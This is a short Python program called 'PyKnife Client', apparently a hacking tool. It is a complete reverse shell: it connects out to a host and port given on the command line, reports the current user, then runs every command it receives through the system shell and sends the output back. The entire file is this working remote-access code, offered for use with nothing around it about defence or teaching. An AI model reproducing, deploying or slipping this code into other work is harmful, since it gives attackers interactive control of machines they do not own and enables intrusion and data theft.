# -*- coding: utf-8 -*-
import socket
import sys
import getopt
import chardet
import subprocess as sp


def shell(c):
    try:
        output = sp.check_output(c, shell=True, stderr=sp.STDOUT)
        return output
    except Exception:
        msg = '[!]Command %s Error!' % c
        return msg.encode()


def conn(ip, port):
    print('[+]Trying to connect to %s:%s' % (ip, port))
    try:
        client = socket.socket()
        client.connect((ip, port))
        w = shell('whoami')
        client.send(b'\n[+]Current user is: %s \n # ' % w)
        print('[+]Connected.')
        while True:
            data = client.recv(1024)
            print(data)  # for debug
            codetype = chardet.detect(data)['encoding']
            res = shell(data.decode(codetype).strip())
            data = res + b'\n %s # ' % w
            client.send(data)
    except Exception as e:
        print('[!]Exit.\n %s' % e)
        client.close()


def helpmsg():
    msg = '''
    PyKnife Client
    Author: F1tz

        -h  --help      Show this massage.
        -d  --host      Specify destination hostname or IP Address.
        -p  --port      Specify destination port number.

    Examples:
        c.py -d 127.0.0.1 -p 8000
        c.py --host 8.8.8.8 --port 6789
    '''
    print(msg)


def main():
    argv = sys.argv[1:]
    if not argv:
        helpmsg()
        return 0
    ip = ''
    port = 0
    try:
        opts, others = getopt.getopt(argv, 'hd:p:', ('help', 'host=', 'port='))
        for opt, arg in opts:
            if opt in ('-h', '--help'):
                helpmsg()
            elif opt in ('-d', '--host'):
                ip = arg
            elif opt in ('-p', '--port'):
                port = int(arg)

    except getopt.GetoptError as e:
        helpmsg()
        print('\n[!]', e)
        return 0

    if (ip != '') & (port > 0):
        conn(ip, port)
    else:
        print('[!] Must specify IP and port correctly.')


if __name__ == '__main__':
    main()
